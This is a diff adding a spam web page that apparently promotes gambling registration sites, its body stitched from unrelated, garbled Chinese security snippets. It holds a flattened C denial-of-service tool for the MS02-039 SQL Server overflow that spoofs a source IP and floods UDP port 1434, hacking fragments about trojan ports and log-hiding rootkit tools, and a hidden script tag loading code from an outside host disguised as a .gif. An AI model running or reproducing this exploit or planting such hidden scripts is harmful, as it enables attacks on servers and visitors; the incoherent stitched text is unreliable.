@@ -1,0 +1,83 @@
+<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>凯美注册 - 网站</title>
+<meta content="all" name="robots" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
+<div class="wrap">
+   <div class="clear blank10"></div>
+   <div class="navi">　您现在的位置 <a  href="http:///baiducom">首页</a> ><a  href="http:///baidu">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidugo">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
+   <div class="clear blank10"></div>
+   <div class="newsmain">
+      <div id="side">
+	      <div class="sideNav">
+		     <h2>热门文章</h2>
+		        <ul><li><a href="http://www.15bl.com/baiducom">合乐888在线注册</a></li>
+</ul>
+		   <div class="sidebottom"></div>
+	       </div>
+       </div>
+       <div class="rightPar" id="about">
+            <div class="aboutTitle">
+                <h3><span>作者：admin </span> 凯美注册</h3>
+            </div>
+              <div id="MyContent">
+					<div id="MyContent"><p>如果你的安全策略不允许敏感信息在未加密的前提下通过传输，你就需要在流量发送到Web器之前重新进行加密的解决方案。
+</p>
+<p>它以共享软件(Shareware)的形式传播。
+</p>
+<p>SLOverflowdostoolReference:MS020SLOverflowdostoolReference:MS02039Author:refdomEmail:refdom263.netHomepage:www.opengram#include#include#include#include#include#pragmacomment(lib,"ws2_32.lib")#defineSOURCE_PORT53#defineDEST_PORT1434typedefstructip_hdr定义IP首部unsignedcharh_verlen;4位首部长度,4位IP版本号unsignedchartos;8位类型TOSunsignedshorttotal_len;16位总长度unsignedshortident;16位标识unsignedshortfrag_and_flags;3位标志位unsignedcharttl;8位生存时间TTLunsignedcharproto;8位协议(TCP,UDP或其他)unsignedshortchecksum;16位IP首部校验和unsignedintsourceIP;32位源IP地址unsignedintdestIP;32位目的IP地址IP_HEADER;struct定义TCP伪首部unsignedlongsaddr;源地址unsignedlongdaddr;目的地址charmbz;charptcl;协议类型unsignedshorttcpl;TCP长度psd_header;typedefstructtcp_hdr定义TCP首部USHORTth_sport;16位源端口USHORTth_dport;16位目的端口unsignedintth_se;32位序列号unsignedintth_ack;32位确认号unsignedcharth_lenres;4位首部长度6位保留字unsignedcharth_flag;6位标志位USHORTth_win;16位窗口大小USHORTth_sum;16位校验和USHORTth_urp;16位紧急偏移量TCP_HEADER;typedefstructudp_hdrUDP首部unsignedshortsourceport;unsignedshortdestport;unsignedshortudp_length;unsignedshortudp_checksum;UDP_HEADER;CheckSum:计算校验和的子函数USHORTchecksum(USHORTbuffer,intsize)unsignedlongcksum=0;while(size>1)cksum+=buffer++;size=sizeof(USHORT);if(size)cksum+=(UCHAR)buffer;cksum=(cksum>>16)+(cksum&0xffff);cksum+=(cksum>>16);return(USHORT)(cksum);voidUsage()printf("");printf("SLOverFlowDOS(MS02039)");printf("WrittenbyRefdom");printf("Email:refdom263.net");printf("Homepage:www.opengram");printf("Useage:SLDOS.exeFake_ipTarget_ip");printf("");voidSendudp(unsignedlongulTargetIP,unsignedlongulFakeIP)SOCKETsock;SOCKADDR_INaddr_in;BOOLflag;charbuf[80]=0;IP_HEADERipHeader;UDP_HEADERudpHeader;intiTotalSize,iUdpCheckSumSize,i,j;charsendbuf[256]=0;charptr=NULL;memset(buf,"A",sizeof(buf)2);buf[0]=0x04;sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);if(sock==INVALID_SOCKET)printf("socketError!");return;flag=true;if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char)&flag,sizeof(flag))==SOCKET_ERROR)printf("setsockoptError!");return;iTotalSize=sizeof(ipHeader)+sizeof(udpHeader)+sizeof(buf);ipHeader.h_verlen=(4<<4)|(sizeof(ipHeader)sizeof(unsignedlong));ipHeader.tos=0;ipHeader.total_len=htons(iTotalSize);ipHeader.ident=0;ipHeader.frag_and_flags=0;ipHeader.ttl=128;ipHeader.proto=IPPROTO_UDP;ipHeader.checksum=0;ipHeader.sourceIP=ulFakeIP;ipHeader.destIP=ulTargetIP;udpHeader.sourceport=htons(SOURCE_PORT);udpHeader.destport=htons(DEST_PORT);udpHeader.udp_length=htons(sizeof(udpHeader)+sizeof(buf));udpHeader.udp_checksum=0;ptr=NULL;计算UDP校验和ZeroMemory(sendbuf,sizeof(sendbuf));ptr=sendbuf;iUdpCheckSumSize=0;udpHeader.udp_checksum=0;memcpy(ptr,&ipHeader.sourceIP,sizeof(ipHeader.sourceIP));ptr+=sizeof(ipHeader.sourceIP);iUdpCheckSumSize+=sizeof(ipHeader.sourceIP);memcpy(ptr,&ipHeader.destIP,sizeof(ipHeader.destIP));ptr+=sizeof(ipHeader.destIP);iUdpCheckSumSize+=sizeof(ipHeader.destIP);ptr++;iUdpCheckSumSize++;memcpy(ptr,&ipHeader.proto,sizeof(ipHeader.proto));ptr+=sizeof(ipHeader.proto);iUdpCheckSumSize+=sizeof(ipHeader.proto);memcpy(ptr,&udpHeader.udp_length,sizeof(udpHeader.udp_length));ptr+=sizeof(udpHeader.udp_length);iUdpCheckSumSize+=sizeof(udpHeader.udp_length);memcpy(ptr,&udpHeader,sizeof(udpHeader));ptr+=sizeof(udpHeader);iUdpCheckSumSize+=sizeof(udpHeader);for(i=0;i<sizeof(buf);i++,ptr++)ptr=buf[i];iUdpCheckSumSize+=sizeof(buf);udpHeader.udp_checksum=checksum((USHORT)sendbuf,iUdpCheckSumSize);ZeroMemory(sendbuf,sizeof(sendbuf));memcpy(sendbuf,&ipHeader,sizeof(ipHeader));memcpy(sendbuf+sizeof(ipHeader),&udpHeader,sizeof(udpHeader));memcpy(sendbuf+sizeof(ipHeader)+sizeof(udpHeader),buf,sizeof(buf));addr_in.sin_family=AF_INET;addr_in.sin_port=htons(DEST_PORT);addr_in.sin_addr.S_un.S_addr=ulTargetIP;printf("Startingsendpacket");for(j=0;j<5;j++)Sleep(500);if(sendto(sock,sendbuf,iTotalSize,0,(SOCKADDR)&addr_in,sizeof(addr_in))==SOCKET_ERROR)printf("SendError!");return;elseprintf(".");printf("SendOK!");if(sock!=INVALID_SOCKET)closesocket(sock);intmain(intargc,charargv[])WSADATAWSAData;unsignedlongulTargetIP,ulFakeIP;Usage();if(argc<3)returnfalse;ulTargetIP=inet_addr(argv[1]);ulFakeIP=inet_addr(argv[2]);if(WSAStartup(MAKEWORD(2,0),&WSAData)!=0)printf("WSAStartuperror.Error:%d",WSAGetLastError());returnfalse;printf("DOSstarting...");Sendudp(ulTargetIP,ulFakeIP);printf("Complete!");WSACleanup();return0;
+</p>
+<p>或response.setBufferSize(1);
+</p>
+<p>怎么办？真是急死人！不要急，我们有办法可以获得一些，具体方法有很多，我们现在就介绍几种：1、利用目标骰腇INGER功能还记得上一章介绍的工具吗？对就是HAKTEK，它的FINGER功能可以完全胜任，在TARGET中输入目标主机的地址，或IP都可以，选择FINGER按钮，就会出现例如下面的信息：Targetchangedtoxx.xx.xxEstablishingrealtimeuserlist...(Onlyworksifthesysadminisamoron)[Fingersession]LoginNameTTYIdleWhenWherexxxx????pts82dfri16:15xx.xx.xx.xx....记录上述信息，经过一段时间的监测，就会积累一定的信息。
+</p>
+<p>好在多数商业化的入侵检测系统配置了可用的防御性反攻击模块，起码可以切断TCP连接或动态地更改互动防火墙过滤规则。
+</p>
+<p>从checkpoint的站点上得到的资源来看，这些解决方案的效果还是比较理想的。
+</p>
+<p>对于还没有取得MCSAMCSE认证的考生需要参照下面的考试要求：MCSA:Security认证title客户端操作系统类考试70210Windows2000Professional或者70270WindowsXP网络与系统类考试70215Windows2000Server70218ManagingaWindows2000Network网络与系统安全类考试70214ImplementingWindows2000Security70227InternetandSecurityAcceleration(ISA)Server2000MCSE:Security安全认证考试要求MCSE:Security认证title客户端操作系统类考试70210Windows2000Professional或者70270WindowsXP网络与系统类考试70215Windows2000Server70216Implementing,AdministeringaWindows2000Network70217Implementing,AdministeringWindows2000DirectoryServices网络与系统安全类考试70214ImplementingWindows2000Security70220DesigningWindows2000Security70227InternetandSecurityAcceleration(ISA)Server2000在安全类考试部分，MCSE:Security与MCSA:Security相比多了一门70220DesigningWindows2000Security考试。
+</p>
+<p>。
+</p>
+<p>tcpd阻止向日志中记录某些连接syslogd过滤掉日志中的某些连接信息木马程序为本地用户提供后门，包括：chfn提升本地普通用户权限的程序。
+</p>
+<p>病毒杀不掉的原因主要有:
+</p>
+<p>警告窗口是软件设计者用来不断提醒用户购买正版软件的窗口，这样的窗口会在软件启动或运行过程中不时弹出，非常令人讨厌。
+</p>
+<p>再将Port填入4444，这是木马的端口号，当然你也可以用别的。
+</p>
+<p>如果这样的话，还需要自行纠正一下。
+</p>
+<p>有许多公司采用着Python＋MySl的架构。
+</p>
+<p>每一年报告给CERTCC的数量都成倍增长。
+</p>
+<p>例2下面这个例子将在本地计算机上，建立一个，它将会是一个运行，并且运行在他自己的进程上。
+</p>
+<p>这是小弟我改写一位哥哥的源码。
+</p>
+<p>IRP有两部分组成：固定部分和一个或多个堆栈单元。
+</p>
+
+					<br/>
+					<p align=left >上一篇：<a href="261.html">合乐888平台如何
+</a>|下一篇：<a href="263.html">优游时时彩的网址
+</a></P>
+					</div>
+		  </div>
+     </div>
+  </div>
+</div>
+<div class="clear blank10"></div>
+<div class="copyright"> <br>
+ </div>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
+  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
+</body>
+</html>
